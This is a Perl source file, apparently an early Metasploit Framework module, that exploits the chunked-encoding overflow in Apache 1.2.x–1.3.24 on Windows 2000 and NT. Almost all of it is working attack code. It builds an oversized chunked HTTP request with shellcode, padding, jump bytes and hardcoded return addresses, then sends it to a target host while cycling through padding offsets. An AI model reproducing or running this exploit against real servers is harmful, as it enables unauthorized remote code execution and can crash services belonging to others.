package Msf::Exploit::apache_chunked_win32;
use base "Msf::Exploit";
use strict;

my %info =
(
    'Name'  => 'Apache Win32 Chunked Encoding',
    'Version'  => '2.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Size'  => 8100,
                 'BadChars'  => "\x00+&=%\x0a\x0d\x20",
               },
    
    'Description'  => "This exploits the chunked encoding bug found in Apache versions ".
                      "1.2.x to 1.3.24. This particular module will only work reliably ".
                      "against versions 1.3.17 on up running on Windows 2000 or NT. This ".
                      " exploit may complelely crash certain versions of Apache shipped with ".
                      "Oracle and various web application frameworks.",
                
    'Refs'  =>  [  
                    'http://lists.insecure.org/lists/bugtraq/2002/Jun/0184.html'
                ],
    'Targets' => [
                   ['Windows 2000', 0x1c0f143c, "\x81\xc4\x14\x05\x00\x00\xff\xe4"],
                   ['Windows NT',   0x1c0f1022, "\x81\xec\x18\xfc\xff\xff\xff\xe4"],
                 ],
);


sub new {
    my $class = shift;
    my $obj = $class->SUPER::new({'Info' => \%info}, @_);
    return $obj;
}

sub Exploit {
    my ($obj, $opt) = @_;
    
    select(STDOUT);$|++;

    my $target_host = $opt->{"RHOST"};
    my $target_port = $opt->{"RPORT"};

    
    # create the payload
    my $shellcode = $opt->{'SHELLCODE'};

    my @targets;
    my @offsets;
    my $pad;

    @targets = defined($opt->{'TARGET'}) ? ($obj->{'Info'}->{'Targets'}->[ $opt->{'TARGET'} ]) : @{$obj->{'Info'}->{'Targets'}};
    
    for ($pad = 348; $pad < 368; $pad += 4)  { foreach my $target (@targets) { push @offsets, [$pad, $target->[1], $target->[2], $target->[0]] } }
    for ($pad = 200; $pad < 348; $pad += 4)  { foreach my $target (@targets) { push @offsets, [$pad, $target->[1], $target->[2], $target->[0]] } }
    for ($pad = 360; $pad < 400; $pad += 4)  { foreach my $target (@targets) { push @offsets, [$pad, $target->[1], $target->[2], $target->[0]] } }


    foreach my $offset (@offsets)
    {
        my $request;
        $request  = "GET / HTTP/1.1\r\n";
        $request .= "Host: $target_host:$target_port\r\n";
        $request .= "Transfer-Encoding: CHUNKED\r\n";
        $request .= "\r\n";
        $request .= "DEADBEEF ";

        # large nop sled plus shellcode
        $request .= $shellcode . "\r\n";

        # these three bytes are for address alignment
        $request .= "PAD";  

        # place the appropriate amount of padding
        $request .= ("O" x $offset->[0]);

        # this is where ebx or esi points, make it jump over the return address
        $request .= "XX" . "\xeb\x04\xeb\x04";  

        # this is the return address
        $request .= pack("l", $offset->[1]);

        # a mini nop sled for the short jmp to land in
        $request .= ("\x90" x 16);

        # target prologue
        $request .= $offset->[2];
        
        
        my $s = Pex::Socket->new( {"SSL" => $opt->{"SSL"}} );
        if (! $s->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
        {
            print "[*] Could not connect: " . $s->get_error() . "\n";
        }
    
        print "[*] Trying to exploit ". $offset->[3] ." using return " . sprintf("0x%.8x", $offset->[1]) . " with padding of " . $offset->[0] . "...\n";
        $s->send($request);
        sleep(2);
        $s->close();
    }
}


1;
